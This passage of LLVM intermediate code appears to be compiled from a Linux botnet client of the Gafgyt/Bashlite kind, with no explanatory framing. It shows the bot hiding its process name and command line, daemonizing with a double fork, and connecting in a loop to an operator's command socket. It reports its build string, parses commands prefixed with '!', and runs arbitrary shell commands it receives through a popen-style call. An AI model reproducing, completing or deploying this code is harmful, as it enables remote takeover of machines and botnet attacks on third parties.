  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.112, i64 0, i64 0)) #3
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #18
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #3
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #3
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.113, i64 0, i64 0), i32 0) #3
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit17, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.114, i64 0, i64 0)) #15
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.015 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.015, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.015, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.015, align 1
  br label %.loopexit17

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit17.loopexit, label %.lr.ph

.loopexit17.loopexit:                             ; preds = %36
  br label %.loopexit17

.loopexit17:                                      ; preds = %.loopexit17.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #3
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit17
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #3
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #3
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep20 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep20, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit17
  %45 = call i32 @close(i32 %6) #3
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #5

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i8* @getBuild() local_unnamed_addr #14 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.115, i64 0, i64 0)
}

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture) local_unnamed_addr #13 {
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca [1024 x i8], align 16
  %6 = alloca [10 x i8*], align 16
  %7 = tail call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.117, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.115, i64 0, i64 0))
  %8 = load i8*, i8** %1, align 8
  %9 = tail call i64 @strlen(i8* %8) #15
  tail call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 %9, i32 1, i1 false)
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.116, i64 0, i64 0), i8** %1, align 8
  %10 = tail call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 ptrtoint ([1 x i8]* @.str.116 to i64), i32 0, i32 0, i32 0) #3
  %11 = tail call i64 @time(i64* null) #3
  %12 = tail call i32 @getpid() #3
  %13 = zext i32 %12 to i64
  %14 = xor i64 %13, %11
  %15 = trunc i64 %14 to i32
  tail call void @srand(i32 %15) #3
  %16 = tail call i64 @time(i64* null) #3
  %17 = tail call i32 @getpid() #3
  %18 = zext i32 %17 to i64
  %19 = xor i64 %18, %16
  %20 = trunc i64 %19 to i32
  tail call void @init_rand(i32 %20)
  %21 = tail call i32 @getOurIP()
  %22 = tail call i32 @fork() #3
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %26, label %24

; <label>:24:                                     ; preds = %2
  %25 = call i32 @waitpid(i32 %22, i32* nonnull %3, i32 0) #3
  call void @exit(i32 0) #17
  unreachable

; <label>:26:                                     ; preds = %2
  %27 = tail call i32 @fork() #3
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %30, label %29

; <label>:29:                                     ; preds = %26
  tail call void @exit(i32 0) #17
  unreachable

; <label>:30:                                     ; preds = %26
  %31 = tail call i32 @setsid() #3
  %32 = tail call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.119, i64 0, i64 0)) #3
  %33 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  %34 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %35 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 1
  %36 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 0
  br label %.backedge84

.backedge84.loopexit:                             ; preds = %.backedge
  br label %.backedge84.backedge

.backedge84:                                      ; preds = %.backedge84.backedge, %30
  %37 = call i32 @initConnection()
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %41, label %39

; <label>:39:                                     ; preds = %.backedge84
  %40 = call i32 @sleep(i32 5) #3
  br label %.backedge84.backedge

; <label>:41:                                     ; preds = %.backedge84
  %42 = load i32, i32* @mainCommSock, align 4
  %43 = call i32 (i32, i8*, ...) @sockprintf(i32 %42, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.120, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.115, i64 0, i64 0))
  %44 = load i32, i32* @mainCommSock, align 4
  %45 = call i32 @recvLine(i32 %44, i8* nonnull %34, i32 4096)
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %.backedge84.backedge, label %.preheader82.preheader

.backedge84.backedge:                             ; preds = %41, %39, %.backedge84.loopexit
  br label %.backedge84

.preheader82.preheader:                           ; preds = %41
  br label %.preheader82

.preheader82:                                     ; preds = %.preheader82.preheader, %.backedge
  %47 = phi i32 [ %102, %.backedge ], [ %45, %.preheader82.preheader ]
  %48 = load i64, i64* @numpids, align 8
  %49 = icmp eq i64 %48, 0
  br i1 %49, label %._crit_edge101, label %.lr.ph100.preheader

.lr.ph100.preheader:                              ; preds = %.preheader82
  br label %.lr.ph100

.lr.ph100:                                        ; preds = %.lr.ph100.preheader, %92
  %indvars.iv = phi i64 [ %indvars.iv.next, %92 ], [ 0, %.lr.ph100.preheader ]
  %50 = load i32*, i32** @pids, align 8
  %51 = getelementptr inbounds i32, i32* %50, i64 %indvars.iv
  %52 = load i32, i32* %51, align 4
  %53 = call i32 @waitpid(i32 %52, i32* null, i32 1) #3
  %54 = icmp sgt i32 %53, 0
  br i1 %54, label %.preheader, label %92

.preheader:                                       ; preds = %.lr.ph100
  %55 = add nuw i64 %indvars.iv, 1
  %56 = load i64, i64* @numpids, align 8
  %57 = icmp ult i64 %55, %56
  %58 = load i32*, i32** @pids, align 8
  %59 = trunc i64 %indvars.iv to i32
  br i1 %57, label %.lr.ph91.preheader, label %._crit_edge92

.lr.ph91.preheader:                               ; preds = %.preheader
  %60 = trunc i64 %55 to i32
  %61 = trunc i64 %indvars.iv to i32
  br label %.lr.ph91

.lr.ph91:                                         ; preds = %.lr.ph91.preheader, %.lr.ph91
  %62 = phi i32* [ %71, %.lr.ph91 ], [ %58, %.lr.ph91.preheader ]
  %63 = phi i64 [ %68, %.lr.ph91 ], [ %55, %.lr.ph91.preheader ]
  %.07190 = phi i32 [ %.071, %.lr.ph91 ], [ %60, %.lr.ph91.preheader ]
  %.071.in89 = phi i32 [ %.07190, %.lr.ph91 ], [ %61, %.lr.ph91.preheader ]
  %64 = getelementptr inbounds i32, i32* %62, i64 %63
  %65 = load i32, i32* %64, align 4
  %66 = zext i32 %.071.in89 to i64
  %67 = getelementptr inbounds i32, i32* %62, i64 %66
  store i32 %65, i32* %67, align 4
  %.071 = add i32 %.07190, 1
  %68 = zext i32 %.071 to i64
  %69 = load i64, i64* @numpids, align 8
  %70 = icmp ult i64 %68, %69
  %71 = load i32*, i32** @pids, align 8
  br i1 %70, label %.lr.ph91, label %._crit_edge92.loopexit

._crit_edge92.loopexit:                           ; preds = %.lr.ph91
  br label %._crit_edge92

._crit_edge92:                                    ; preds = %._crit_edge92.loopexit, %.preheader
  %.071.in.lcssa = phi i32 [ %59, %.preheader ], [ %.07190, %._crit_edge92.loopexit ]
  %.lcssa = phi i32* [ %58, %.preheader ], [ %71, %._crit_edge92.loopexit ]
  %72 = zext i32 %.071.in.lcssa to i64
  %73 = getelementptr inbounds i32, i32* %.lcssa, i64 %72
  store i32 0, i32* %73, align 4
  %74 = load i64, i64* @numpids, align 8
  %75 = add i64 %74, -1
  store i64 %75, i64* @numpids, align 8
  %76 = shl i64 %74, 2
  %77 = call noalias i8* @malloc(i64 %76) #3
  %78 = bitcast i8* %77 to i32*
  %79 = icmp eq i64 %75, 0
  %80 = load i32*, i32** @pids, align 8
  br i1 %79, label %._crit_edge97, label %.lr.ph96.preheader

.lr.ph96.preheader:                               ; preds = %._crit_edge92
  br label %.lr.ph96

.lr.ph96:                                         ; preds = %.lr.ph96.preheader, %.lr.ph96
  %81 = phi i32* [ %90, %.lr.ph96 ], [ %80, %.lr.ph96.preheader ]
  %82 = phi i64 [ %87, %.lr.ph96 ], [ 0, %.lr.ph96.preheader ]
  %.17294 = phi i32 [ %86, %.lr.ph96 ], [ 0, %.lr.ph96.preheader ]
  %83 = getelementptr inbounds i32, i32* %81, i64 %82
  %84 = load i32, i32* %83, align 4
  %85 = getelementptr inbounds i32, i32* %78, i64 %82
  store i32 %84, i32* %85, align 4
  %86 = add i32 %.17294, 1
  %87 = zext i32 %86 to i64
  %88 = load i64, i64* @numpids, align 8
  %89 = icmp ult i64 %87, %88
  %90 = load i32*, i32** @pids, align 8
  br i1 %89, label %.lr.ph96, label %._crit_edge97.loopexit

._crit_edge97.loopexit:                           ; preds = %.lr.ph96
  br label %._crit_edge97

._crit_edge97:                                    ; preds = %._crit_edge97.loopexit, %._crit_edge92
  %.lcssa85 = phi i32* [ %80, %._crit_edge92 ], [ %90, %._crit_edge97.loopexit ]
  %91 = bitcast i32* %.lcssa85 to i8*
  call void @free(i8* %91) #3
  store i8* %77, i8** bitcast (i32** @pids to i8**), align 8
  br label %92

; <label>:92:                                     ; preds = %.lr.ph100, %._crit_edge97
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %sext = shl i64 %indvars.iv.next, 32
  %93 = ashr exact i64 %sext, 32
  %94 = load i64, i64* @numpids, align 8
  %95 = icmp ult i64 %93, %94
  br i1 %95, label %.lr.ph100, label %._crit_edge101.loopexit

._crit_edge101.loopexit:                          ; preds = %92
  br label %._crit_edge101

._crit_edge101:                                   ; preds = %._crit_edge101.loopexit, %.preheader82
  %96 = sext i32 %47 to i64
  %97 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %96
  store i8 0, i8* %97, align 1
  call void @trim(i8* nonnull %34)
  %strncmp = call i32 @strncmp(i8* nonnull %34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i64 0, i64 0), i64 4)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %98, label %104

; <label>:98:                                     ; preds = %._crit_edge101
  %99 = load i32, i32* @mainCommSock, align 4
  %100 = call i32 (i32, i8*, ...) @sockprintf(i32 %99, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.121, i64 0, i64 0))
  br label %.backedge

.backedge.loopexit:                               ; preds = %.lr.ph113
  br label %.backedge

.backedge.loopexit133:                            ; preds = %.preheader114
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit133, %.backedge.loopexit, %._crit_edge110.thread, %98, %._crit_edge110, %106, %138
  %101 = load i32, i32* @mainCommSock, align 4
  %102 = call i32 @recvLine(i32 %101, i8* nonnull %34, i32 4096)
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %.backedge84.loopexit, label %.preheader82

; <label>:104:                                    ; preds = %._crit_edge101
  %strncmp74 = call i32 @strncmp(i8* nonnull %34, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.122, i64 0, i64 0), i64 3)
  %cmp75 = icmp eq i32 %strncmp74, 0
  br i1 %cmp75, label %105, label %106

; <label>:105:                                    ; preds = %104
  call void @exit(i32 0) #17
  unreachable

; <label>:106:                                    ; preds = %104
  %107 = load i8, i8* %34, align 16
  %108 = icmp eq i8 %107, 33
  br i1 %108, label %.preheader114.preheader, label %.backedge

.preheader114.preheader:                          ; preds = %106
  br label %.preheader114

.preheader114:                                    ; preds = %.preheader114.preheader, %110
  %.069 = phi i8* [ %111, %110 ], [ %35, %.preheader114.preheader ]
  %109 = load i8, i8* %.069, align 1
  switch i8 %109, label %110 [
    i8 0, label %.backedge.loopexit133
    i8 32, label %112
  ]

; <label>:110:                                    ; preds = %.preheader114
  %111 = getelementptr inbounds i8, i8* %.069, i64 1
  br label %.preheader114

; <label>:112:                                    ; preds = %.preheader114
  store i8 0, i8* %.069, align 1
  %113 = call i64 @strlen(i8* %35) #15
  %114 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %113
  %115 = getelementptr inbounds i8, i8* %114, i64 2
  br label %116

; <label>:116:                                    ; preds = %121, %112
  %117 = call i64 @strlen(i8* %115) #15
  %118 = add i64 %117, -1
  %119 = getelementptr inbounds i8, i8* %115, i64 %118
  %120 = load i8, i8* %119, align 1
  switch i8 %120, label %.preheader80.preheader [
    i8 13, label %121
    i8 10, label %121
  ]

.preheader80.preheader:                           ; preds = %116
  br label %.preheader80

; <label>:121:                                    ; preds = %116, %116
  store i8 0, i8* %119, align 1
  br label %116

.preheader80:                                     ; preds = %.preheader80.preheader, %123
  %.070 = phi i8* [ %124, %123 ], [ %115, %.preheader80.preheader ]
  %122 = load i8, i8* %.070, align 1
  switch i8 %122, label %123 [
    i8 32, label %125
    i8 0, label %125
  ]

; <label>:123:                                    ; preds = %.preheader80
  %124 = getelementptr inbounds i8, i8* %.070, i64 1
  br label %.preheader80

; <label>:125:                                    ; preds = %.preheader80, %.preheader80
  store i8 0, i8* %.070, align 1
  %126 = getelementptr inbounds i8, i8* %.070, i64 1
  %127 = load i8, i8* %115, align 1
  %128 = icmp eq i8 %127, 0
  br i1 %128, label %._crit_edge105, label %.lr.ph104.preheader

.lr.ph104.preheader:                              ; preds = %125
  br label %.lr.ph104

.lr.ph104:                                        ; preds = %.lr.ph104.preheader, %.lr.ph104
  %129 = phi i8 [ %134, %.lr.ph104 ], [ %127, %.lr.ph104.preheader ]
  %.067102 = phi i8* [ %133, %.lr.ph104 ], [ %115, %.lr.ph104.preheader ]
  %130 = zext i8 %129 to i32
  %131 = call i32 @toupper(i32 %130) #15
  %132 = trunc i32 %131 to i8
  store i8 %132, i8* %.067102, align 1
  %133 = getelementptr inbounds i8, i8* %.067102, i64 1
  %134 = load i8, i8* %133, align 1
  %135 = icmp eq i8 %134, 0
  br i1 %135, label %._crit_edge105.loopexit, label %.lr.ph104

._crit_edge105.loopexit:                          ; preds = %.lr.ph104
  br label %._crit_edge105

._crit_edge105:                                   ; preds = %._crit_edge105.loopexit, %125
  %136 = call i32 @strcmp(i8* %115, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.123, i64 0, i64 0)) #15
  %137 = icmp eq i32 %136, 0
  br i1 %137, label %138, label %151

; <label>:138:                                    ; preds = %._crit_edge105
  %139 = call i32 @listFork()
  %140 = icmp eq i32 %139, 0
  br i1 %140, label %141, label %.backedge

; <label>:141:                                    ; preds = %138
  %142 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %142, i8 0, i64 1024, i32 16, i1 false)
  %143 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %142, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.124, i64 0, i64 0), i8* %126)
  %144 = call i32 @fdpopen(i8* nonnull %142, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.125, i64 0, i64 0))
  %145 = call i8* @fdgets(i8* nonnull %142, i32 1024, i32 %144)
  %146 = icmp eq i8* %145, null
  br i1 %146, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %141
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  call void @trim(i8* nonnull %142)
  call void @llvm.memset.p0i8.i64(i8* nonnull %142, i8 0, i64 1024, i32 16, i1 false)
  %147 = call i32 @sleep(i32 1) #3
  %148 = call i8* @fdgets(i8* nonnull %142, i32 1024, i32 %144)
  %149 = icmp eq i8* %148, null
  br i1 %149, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %141
  %150 = call i32 @fdpclose(i32 %144)
  call void @exit(i32 0) #17
  unreachable

; <label>:151:                                    ; preds = %._crit_edge105
  %152 = call i8* @strtok(i8* %126, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i64 0, i64 0)) #3
  store i8* %115, i8** %36, align 16
  %153 = icmp eq i8* %152, null
  br i1 %153, label %._crit_edge110.thread, label %.lr.ph109.preheader

.lr.ph109.preheader:                              ; preds = %151
  br label %.lr.ph109

._crit_edge110.thread:                            ; preds = %151
  call void @processCmd(i32 1, i8** nonnull %36)
  br label %.backedge

.lr.ph109:                                        ; preds = %.lr.ph109.preheader, %166
  %.065107 = phi i8* [ %167, %166 ], [ %152, %.lr.ph109.preheader ]
  %.066106 = phi i32 [ %.1, %166 ], [ 1, %.lr.ph109.preheader ]
  %154 = load i8, i8* %.065107, align 1
  %155 = icmp eq i8 %154, 10
  br i1 %155, label %166, label %156

; <label>:156:                                    ; preds = %.lr.ph109
  %157 = call i64 @strlen(i8* nonnull %.065107) #15
  %158 = add i64 %157, 1
  %159 = call noalias i8* @malloc(i64 %158) #3
  %160 = sext i32 %.066106 to i64
  %161 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %160
  store i8* %159, i8** %161, align 8
  %162 = call i64 @strlen(i8* nonnull %.065107) #15
  %163 = add i64 %162, 1
  call void @llvm.memset.p0i8.i64(i8* %159, i8 0, i64 %163, i32 1, i1 false)
  %164 = call i8* @strcpy(i8* %159, i8* nonnull %.065107) #3
  %165 = add nsw i32 %.066106, 1
  br label %166

; <label>:166:                                    ; preds = %.lr.ph109, %156
  %.1 = phi i32 [ %165, %156 ], [ %.066106, %.lr.ph109 ]
  %167 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i64 0, i64 0)) #3
  %168 = icmp eq i8* %167, null
  br i1 %168, label %._crit_edge110, label %.lr.ph109

._crit_edge110:                                   ; preds = %166
  call void @processCmd(i32 %.1, i8** nonnull %36)
  %169 = icmp sgt i32 %.1, 1
  br i1 %169, label %.lr.ph113.preheader, label %.backedge

.lr.ph113.preheader:                              ; preds = %._crit_edge110
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph113

.lr.ph113:                                        ; preds = %.lr.ph113.preheader, %.lr.ph113
  %indvars.iv121 = phi i64 [ %indvars.iv.next122, %.lr.ph113 ], [ 1, %.lr.ph113.preheader ]
  %170 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %indvars.iv121
  %171 = load i8*, i8** %170, align 8
  call void @free(i8* %171) #3
  %indvars.iv.next122 = add nuw nsw i64 %indvars.iv121, 1
  %exitcond = icmp eq i64 %indvars.iv.next122, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph113
}

; Function Attrs: nounwind
declare i32 @printf(i8* nocapture readonly, ...) local_unnamed_addr #5

declare i32 @prctl(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @setsid() local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #5

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #15

; Function Attrs: nounwind
declare i32 @fputs(i8* nocapture readonly, %struct._IO_FILE* nocapture) #3

attributes #0 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #15 = { nounwind readonly }
attributes #16 = { nounwind returns_twice }
attributes #17 = { noreturn nounwind }
attributes #18 = { nounwind readnone }
attributes #19 = { cold }

!llvm.ident = !{!0, !0}

